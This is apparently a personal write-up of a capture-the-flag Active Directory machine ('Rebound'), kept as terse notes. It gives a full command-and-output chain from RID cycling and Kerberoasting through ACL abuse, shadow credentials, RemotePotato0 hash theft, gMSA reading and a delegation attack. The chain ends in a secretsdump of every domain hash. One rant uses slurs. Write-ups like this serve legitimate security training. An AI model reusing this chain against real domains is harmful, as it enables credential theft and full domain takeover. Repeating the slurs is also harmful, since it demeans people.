 
scan

```python
kali@kali ~> nmap -sC -sV 10.10.11.231
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 12:52 EST
Nmap scan report for 10.10.11.231
Host is up (0.083s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-11 00:52:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2025-02-11T00:53:26+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2025-02-11T00:53:25+00:00; +7h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T00:53:26+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T00:53:25+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-11T00:53:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.35 seconds
```




RID Cycling


```python
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\a: (Guest)
SMB         10.10.11.231    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.10.11.231    445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.10.11.231    445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.10.11.231    445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.10.11.231    445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         10.10.11.231    445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         10.10.11.231    445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.231    445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         10.10.11.231    445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.231    445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.231    445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.231    445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.10.11.231    445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         10.10.11.231    445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.231    445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.10.11.231    445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.10.11.231    445    DC01             3382: rebound\fflock (SidTypeUser)

```

okay so I had to increase the RID to 10000 apparently to detect the extra accounts that I had needed to do the attack. i also realised how much of a godsend awk really is

turns out we need to do a asrep roast followed by a preauthentication attack


```python
kali@kali ~/HTB> hashcat -m 13100 --force -a 0 newhash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.


$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$d61e9841f976425c2de99f362c6ec5ea$eb650eab0a8ffb30db85b0e011fa05fbf43690dd3a85d0e5e36062cbc77645bf0dd91379e331364532c6f3828ec2ec939b661b38d293ab5bcb2103e85f0e9209a43a7437d3e6590c8c479777d1bc2f60f9715bc601a1e58704db6a3bd20326dca9c4c64e68175e63e54b15f6760ec7a263cb5f852860bd8b49a1e40dbeb737b9d46514dd6701f1a0a75354520e31a8d7ea1f3a6cb8bc379b17640a93023f68a571eb0d4a9d16951c764e431ebe8dbdcb992c88b07fb22ad9eec6a4e29f0820a53f0580c86e876a0e0291a1008537ffc8060416325c28ea953631d200b12d99a2021a2b5a6cec000e85c8a3ba5dd05ea39c510d972ab4263ae670997d40a58cb1f996208b37a719c336eae19304562c56fd0ef44326e689ed9c02fc28dcf65ea96447d79d7cac6c44ab64d19738ddbe8efaa24916f8d41c6bde8c35f88af34f36167e35fd1db23b5d04506b91149721fe365706a2575f254da1f81094dcdb9dee31182ee4284aca12dc1ce023c67606fe500dae0c9c454f8c00e0d072193f38a0426087cb933a9a02b74bcef3f0e82272651524b5ac02cca97757f4295ef463c64b11ada3238d185f105e0d8fdda5432251c130a5cdb5bacf6ee35fb776a62618bd914584447453ff17c23d2964e4fc3e4aff8f89f166da3b921955fc10c0ae148f6bb45d6b733ad88beee880d644a5cf3a9c7379c66f4cca8729162609c17d5a06bf91a7e60ed880856380158bcddfb4629c319dda70b830df15bab8634f8397d3eb5266c4300a45017c575af42d055fd0ba1b44d519604c37fd87a55f78a98dd2ab7d4093647e7f8281ab01aa8789670d8af770aa578e4e74819b0a4ed6b5e4dacc2db6b93985f654b3de9f57e89551fc9fb96839fdc72b93c626267300fc2823f4abe55cb44718aef54352b537e819df18c921c7f665a486053aad7ec8cc95af6d2aabc4efa4456b826a75dad910786f9cd393a38f830c26b036936d9c0780a4fa1c88b16f042a0b8e6dc7dad9e15814db541d8fe8c44e2122ed65fa1bff1345c6563e9f162b6395cb3eac98c99c26f0f548b34ba42d53de19d1843be4ddd7e4c27aea3c8620465ba951581a947011f2bf51e3a650097f370b57ab71dbb5081a0c13b58976ddeea342b6fa0e8bcf06bda97ec6ff2a53c1640ea5d28e34cddbe3398f829d3a0770c2987c072325f51ea08c1b4a768b23bb8c76abc91febf826e272065c6d06f1a7d8db6cd0c24934d95d6448554a8e1c0b1a869ab189c226104569b2ce12b91db4b8a94b46bf5e7bc553f0aeff7587726ce989cd2e1b38dd313cddb859504c5f94a21205f3051a81b4897191b26fbb3e8aa7f1d075ffd24d4dfec1:1GR8t@$$4u
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*...4dfec1
Time.Started.....: Mon Feb 10 14:17:43 2025, (9 secs)
Time.Estimated...: Mon Feb 10 14:17:52 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1529.8 kH/s (0.84ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13041664/14344385 (90.92%)
Rejected.........: 0/13041664 (0.00%)
Restore.Point....: 13039616/14344385 (90.90%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 1JERITZ -> 1COLORADO
Hardware.Mon.#1..: Util: 71%

Started: Mon Feb 10 14:17:31 2025
Stopped: Mon Feb 10 14:17:53 2025
```




```
ldapmonitor:1GR8t@$$4u
```

![[Rebound-20250210235757673.webp]]


after doing so it'll be sufficient to enough to do  a password spray on all of the users to see who has the same password

here lets do the first thing which is adding self to the group

```python
bloodyAD --host 10.10.11.231 -d rebound.htb -u oorend -p '1GR8t@$$4u' add groupMember SERVICEMGMT oorend
```

then we need to own the OU

```python
dacledit.py 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -k -principal "oorend" -action write -rights FullControl -target-dn "OU=SERVICE USERS,DC=REBOUND,DC=HTB" -debug -inheritance -use-ldaps
```



```python
kali@kali ~> dacledit.py 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -k -principal "oorend" -action write -rights FullControl -target-dn "OU=SERVICE USERS,DC=REBOUND,DC=HTB" -debug -inheritance -use-ldaps
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket
[-] CCache file is not found. Skipping...
[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
[+] Trying to connect to KDC at 10.10.11.231:88
[+] Trying to connect to KDC at 10.10.11.231:88
[+] Trying to connect to KDC at 10.10.11.231:88
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[+] Initializing domainDumper()
[+] Target principal found in LDAP (OU=SERVICE USERS,DC=REBOUND,DC=HTB)
[+] Found principal SID: S-1-5-21-4078382237-1492182817-2568127209-7682
[+] Appending ACE (S-1-5-21-4078382237-1492182817-2568127209-7682 --(FullControl)--> None)
[+] ACE created.
[*] DACL backed up to dacledit-20250210-225656.bak
[+] Attempts to modify the Security Descriptor.
[*] DACL modified successfully!
```


lets take control of this user

```python
bloodyAD --host "10.10.11.231" -d "rebound.htb" -u "oorend" -p '1GR8t@$$4u' add genericAll "WINRM_SVC" "oorend"
```


we have full access so lets get shadow credentials (didnt fix it lol)



```python
certipy shadow auto -u oorend@rebound.htb -p '1GR8t@$$4u' -account winrm_svc -target dc01.rebound.htb -dc-ip 10.10.11.231 -k
```




this step was really fucking retarded not gonna lie, should beeen done better. pretty fucking stupid that I have to look at the writeup to figure out something as fucking simple as this despite it being so it is still very VERY fucking stupid not even hard just tricky + retarded + gay, will add it to my cheatsheet for sure tho.

```
*Evil-WinRM* PS C:\Users\winrm_svc> Invoke-RunasCs x x "qwinsta" -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active

```


so there is a way we can exploit this using either krb relay or rogue potato. rogue potato is the first one that works

```
*Evil-WinRM* PS C:\temp> .\RemotePotato0.exe -m 2                                                                                                                                                                                                                              
[!] Detected a Windows Server version not compatible with JuicyPotato, you cannot run the RogueOxidResolver on 127.0.0.1. RogueOxidResolver must be run remotely.
[!] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999

```


```python
kali@kali ~/tools> sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999
[sudo] password for kali: 
kali
> 2025/02/11 20:03:29.000091163  length=116 from=0 to=115
..\v.....t...........................`R.......!4z.....]........\b.+.H`............`R.......!4z....,..l..@E............< 2025/02/11 20:03:29.000219563  length=84 from=0 to=83
..\f.....T............N....9999...........]........\b.+.H`............................> 2025/02/11 20:03:29.000783924  length=24 from=116 to=139
........................< 2025/02/11 20:03:29.000939068  length=40 from=84 to=123
........(...............................> 2025/02/11 20:03:30.000497265  length=120 from=0 to=119
..\v\a....x.(..........N..............`R.......!4z.....]........\b.+.H`....
.......NTLMSSP.......\b.................

```



```python
*Evil-WinRM* PS C:\temp> .\RemotePotato0.exe -m 2 -x 10.10.14.23 -p 9999 -s 1
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:7ee63255833c2b14:37e0b5da63010b4f3e4323c0f6caa4be:0101000000000000821e8b10eb7cdb015cd312db29c60db80000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800821e8b10eb7cdb01060004000600000008003000300000000000000001000000002000005ed71b8f22a5d712d816390bdde05a01be36c02264113f32c037e0fe5907e3ea0a00100000000000000000000000000000000000090000000000000000000000

```


cracking this we get the password `543BOMBOMBUNmanda`

so the combo is

`tbrady:543BOMBOMBUNmanda`


looking back at the bloodhound path we could see that we can finally  exploit the readgmsapassword

```python
kali@kali ~> nxc ldap 10.10.11.231 -u 'tbrady' -p '543BOMBOMBUNmanda' --gmsa
LDAP        10.10.11.231    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda                                                                                                                                                 
LDAPS       10.10.11.231    636    DC01             [*] Getting GMSA Passwords                                                                                                                                                               
LDAPS       10.10.11.231    636    DC01             Account: delegator$           NTLM: 45326e68995ec3b859228fd504be8617                                                                                                                     
```


so i wanted to enumerate what kind of delegation we have here

```python
*Evil-WinRM* PS C:\temp> Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto                                                                                                                                                         
                                                                                                                                                                                                                                                                              
userprincipalname name      msds-allowedtodelegateto
----------------- ----      ------------------------
                  delegator http/dc01.rebound.htb

```

or what I could have done

findelegation.py

```python
kali@kali ~> findDelegation.py rebound.htb/tbrady:'543BOMBOMBUNmanda' -k
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists 
-----------  -----------------------------------  --------------  ---------------------  ----------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No         

```


steps for constrained delegation without protocol transition how do we make this? what are the steps.

https://www.thehacker.recipes/assets/KCD%20mindmap.BqD0fGv7.png

![[Rebound-20250212023516213.webp|379]]


the steps and the tools theyre needed are all present

1. add B to A's rbcd attribute
2. step 2 which is a 2 in 1
	1. with B credentials conduct a S4U2Self to obtain a service ticket for victim (B)
	2. with B creds, conduct an S4U2proxy with the previous ST ^^^, this will be used as an **additional-ticket** to obtain a forwardable ST for victim to target (A)
3.  with creds A obtain a forwardable ST with the (S4U2Self + ) S4U2Proxy  and the previous ST as "additional ticket" obtains an ST for victim to target


step 1

explaining the flags

To move forward with this attack, I’m going to set ldap_monitor as a trusted to delegate account for delegator$ using the `rbcd.py` script from Impacket.

- `rebound/delegator$` - The account to target. Will auth as this account to the DC.
- `-hashes :E1630B0E18242439A50E9D8B5F5B7524` - The hashes for this account to authenticate.
- `-k` - Use Kerberos authentication (it will use the hash to get a ticket).
- `-delegate-from ldap_monitor` - Set that `ldap_monitor` is allow to delegate.
- `delegate-to 'delegator$'` - Set the it is allow to delegate for delegator$.
- `-action write` - `write` is to set the value. Other choices for `-action` are `read`, `remove`, and `flush`.
- `-dc-ip dc01.rebound.htb` - Tell it where to find the DC.
- `-use-ldaps` - Fixes the binding issues described above.



```python
kali@kali ~> rbcd.py rebound.htb/'delegator$'@dc01.rebound.htb -hashes ':45326e68995ec3b859228fd504be8617' -delegate-to 'delegator$' -delegate-from 'ldap_monitor' -action write  -dc-ip dc01.rebound.htb -use-ldaps -k
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```



 step 2 + 1, so ldap_monitor is allowed to act on the behalf of delegator ?

```python
kali@kali ~> getST.py 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01\$
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

- `-spn browser/dc01.rebound.htb`
	- the SPN that the delegator has


step 3

``` python
kali@kali ~> getST.py -spn http/dc01.rebound.htb -impersonate 'DC01$' 'rebound.htb/delegator$' -hashes :45326e68995ec3b859228fd504be8617 -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache

```


now we do s4u2proxy using the previous cache we got


```python
kali@kali ~ [127]> secretsdump.py -k dc01.rebound.htb
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::
ppaul:1951:aad3b435b51404eeaad3b435b51404ee:7785a4172e31e908159b0904e1153ec0:::
llune:2952:aad3b435b51404eeaad3b435b51404ee:e283977e2cbffafc0d6a6bd2a50ea680:::
fflock:3382:aad3b435b51404eeaad3b435b51404ee:1fc1d0f9c5ada600903200bc308f7981:::
jjones:5277:aad3b435b51404eeaad3b435b51404ee:e1ca2a386be17d4a7f938721ece7fef7:::
mmalone:5569:aad3b435b51404eeaad3b435b51404ee:87becdfa676275415836f7e3871eefa3:::
nnoon:5680:aad3b435b51404eeaad3b435b51404ee:f9a5317b1011878fc527848b6282cd6e:::
ldap_monitor:7681:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::
oorend:7682:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::
winrm_svc:7684:aad3b435b51404eeaad3b435b51404ee:4469650fd892e98933b4536d2e86e512:::
batch_runner:7685:aad3b435b51404eeaad3b435b51404ee:d8a34636c7180c5851c19d3e865814e0:::
tbrady:7686:aad3b435b51404eeaad3b435b51404ee:114e76d0be2f60bd75dc160ab3607215:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:989c1783900ffcb85de8d5ca4430c70f:::
delegator$:7687:aad3b435b51404eeaad3b435b51404ee:45326e68995ec3b859228fd504be8617:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
krbtgt:aes256-cts-hmac-sha1-96:97d63bd13c99edc3e88d42e2e964246a556cced73db6a75219632cdf9a32e192
krbtgt:aes128-cts-hmac-sha1-96:3c2069c0e7aff8ccceddd9b4f533ab2d
krbtgt:des-cbc-md5:2ae5bfc82c7c46cb
ppaul:aes256-cts-hmac-sha1-96:121c70ec57e22ce2752027163d0f7482932d239609194cef652783bc1f1eb2ea
ppaul:aes128-cts-hmac-sha1-96:4ec3a78a5111ca282ab87692d51c4150
ppaul:des-cbc-md5:d354b098136ec726
llune:aes256-cts-hmac-sha1-96:7e8e0bd4dd39ccf4060ca780944c379d975dbd2d4c438db63b21614578ec6384
llune:aes128-cts-hmac-sha1-96:9a7afe8a130f2b9f44309c5c357df71b
llune:des-cbc-md5:a7d0b08310769ebc
fflock:aes256-cts-hmac-sha1-96:5edee5abe58354f436b85a1ea2855319effb6dfa8689fb42c6eaf91662cbf42e
fflock:aes128-cts-hmac-sha1-96:d1c5c3d0734a4c107c1ae0f2eaeb7927
fflock:des-cbc-md5:26b9b9044ca77373
jjones:aes256-cts-hmac-sha1-96:142d9a8b57934fd16ab2e91998279892de9a02e53663babe319c79eedcd29d91
jjones:aes128-cts-hmac-sha1-96:0d09e595b77fe71177925d645b085ee1
jjones:des-cbc-md5:43f8d93291526bda
mmalone:aes256-cts-hmac-sha1-96:b0c89ffdd5af3cc44a79d28d8b6b8735ed09d697ee6f1bc497008abb5a669fe2
mmalone:aes128-cts-hmac-sha1-96:0511a2d3d7214b21a367bc108f6b7ec7
mmalone:des-cbc-md5:23c2ba0be5e98525
nnoon:aes256-cts-hmac-sha1-96:347e911d23f4fb27d5d64dfbdd90ca6b1de7b345f3cafb89dc4b3a9b84508249
nnoon:aes128-cts-hmac-sha1-96:2479824ed08e2b6776483878e5260421
nnoon:des-cbc-md5:26070be583b00e2f
ldap_monitor:aes256-cts-hmac-sha1-96:f259e938b7fd99f96dd0f6dae29ed97d362091df468278556b77ede6d93306c7
ldap_monitor:aes128-cts-hmac-sha1-96:9974760e486e60edda8fa9a71f6fe5fc
ldap_monitor:des-cbc-md5:3b3d4632083e1361
oorend:aes256-cts-hmac-sha1-96:e8841ae154446f8571ac993b8ce989d14e5c31dc8dbfa00f7eb47652609e2048
oorend:aes128-cts-hmac-sha1-96:5f028e7498cadeb751342cfe73a8959a
oorend:des-cbc-md5:19a858d3973df716
winrm_svc:aes256-cts-hmac-sha1-96:886a948e85ab132a30e88c70bb56c3c5294b4f57708b480625af7ae12fc374a1
winrm_svc:aes128-cts-hmac-sha1-96:096f92b7f71828012f8e26f861d4254b
winrm_svc:des-cbc-md5:10894032252a6707
batch_runner:aes256-cts-hmac-sha1-96:b3c35b6d874a958fcce2d2609578097d570ab6eefbc313428c7b49ff9ff69dcb
batch_runner:aes128-cts-hmac-sha1-96:b1841a1db708b64f7395c6c77759b32e
batch_runner:des-cbc-md5:a7d5523dc80ec402
tbrady:aes256-cts-hmac-sha1-96:5c634afa0ffaf0ad3ac04fdd47ffd995362b17b6260172644f3723cfcd3d280f
tbrady:aes128-cts-hmac-sha1-96:a33995844f38022195e60c880e2c8efc
tbrady:des-cbc-md5:46fbdcc22c437fcd
DC01$:aes256-cts-hmac-sha1-96:5cfcef579e83b6b3f8d29dac49ed7b3ee9b43c129600ce55a7d915b7456198c0
DC01$:aes128-cts-hmac-sha1-96:73f487f2cfddcdf50dc5349c836e2ea6
DC01$:des-cbc-md5:0eba19c2f4081619
delegator$:aes256-cts-hmac-sha1-96:f223b15d75fcee859d1ac956c5406b2c5ab8cee33cd59609735a3103ef13ed45
delegator$:aes128-cts-hmac-sha1-96:f4e8635826ffb445b3934fe52e441193
delegator$:des-cbc-md5:e39dcdcb6b383279
[*] Cleaning up... 
kali@kali ~> 

```









---


### Mistakes

- mistake at the first step was impatience, ik the path just use google




## What I learnt

- rid-brute 
- kerberos pre-auth 
- constraint delegation without pre-authentication
- remember to spray and pray


```
kali@kali ~> certipy find -vulnerable -u winrm_svc@rebound.htb -hashes ':4469650fd892e98933b4536d2e86e512' -dc-ip 10.10.11.231 -stdout -k 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[-] Got error: Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Use -debug to print a stacktrace

```


either you have the wrong FQDN or you need to add the FQDN







## Things to do 

- add more constrained delegation notes in FULL
- learn what s4u2self actually does